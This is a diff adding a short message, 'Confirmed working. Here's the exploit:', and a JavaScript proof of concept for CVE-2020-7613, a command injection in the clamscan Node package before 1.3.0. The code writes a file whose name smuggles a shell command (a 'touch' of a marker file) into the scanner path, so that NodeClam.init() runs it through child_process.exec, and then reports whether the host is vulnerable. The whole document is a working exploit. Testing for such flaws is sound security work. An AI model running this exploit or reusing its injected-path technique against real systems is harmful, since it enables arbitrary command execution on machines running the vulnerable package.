@@ -1,0 +1,36 @@
+Confirmed working. Here's the exploit:
+
+```javascript
+// CVE-2020-7613 - clamscan < 1.3.0 command injection via `path` variable
+// in NodeClam._is_clamav_binary(), reached from NodeClam.init().
+// The scanner binary path (attacker/config controlled) is interpolated
+// directly into a shell string and passed to child_process.exec().
+const fs = require('fs');
+const NodeClam = require('clamscan');
+
+// The path only needs to be a real, readable filesystem entry (fs.access
+// check) -- shell metacharacters in the filename itself are what get
+// interpreted when the string is handed to child_process.exec().
+const evilPath = '/tmp/clamscan_evil;touch PWNED_CVE_2020_7613;echo ';
+fs.writeFileSync(evilPath, '');
+
+(async () => {
+    try {
+        await new NodeClam().init({
+            clamscan: { path: evilPath, active: true },
+            clamdscan: { active: false },
+            preference: 'clamscan'
+        });
+    } catch (e) {
+        // init() ultimately rejects because our fake path isn't a real
+        // clamav binary, but the injected shell command already ran
+        // by the time that check happens.
+    }
+
+    console.log(
+        fs.existsSync('PWNED_CVE_2020_7613')
+            ? 'VULNERABLE: arbitrary command executed via `path`'
+            : 'not vulnerable'
+    );
+})();
+```
